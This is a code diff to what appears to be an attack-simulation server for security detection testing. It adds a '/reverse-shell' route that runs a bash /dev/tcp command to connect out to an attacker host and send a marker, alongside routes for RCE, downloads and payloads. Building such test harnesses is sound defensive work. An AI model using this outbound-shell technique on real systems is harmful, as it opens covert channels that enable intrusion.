@@ -48,6 +48,11 @@ async function handleAttack(pathname, marker) {
     await run("/usr/bin/curl", ["-fsS", url, "-o", "/dev/null"]);
     return;
   }
+  if (pathname === "/reverse-shell") {
+    const command = 'exec 3<>"/dev/tcp/$1/$2"; printf "GET /control?marker=%s HTTP/1.0\\r\\n\\r\\n" "$3" >&3; cat <&3 >/dev/null';
+    await run("/bin/bash", ["-c", command, "sysarmor-reverse-shell", attackHost, String(controlPort), marker]);
+    return;
+  }
   const payloadDir = "/tmp/.sysarmor-attack";
   const payloadPath = `${payloadDir}/${marker}`;
   fs.mkdirSync(payloadDir, { recursive: true, mode: 0o700 });
@@ -62,7 +67,7 @@ const server = http.createServer(async (request, response) => {
     sendJson(response, 200, { status: "ok" });
     return;
   }
-  if (!["/rce", "/download", "/payload"].includes(url.pathname)) {
+  if (!["/rce", "/download", "/reverse-shell", "/exec-connect", "/payload"].includes(url.pathname)) {
     sendJson(response, 404, { status: "error", error: "not found" });
     return;
   }
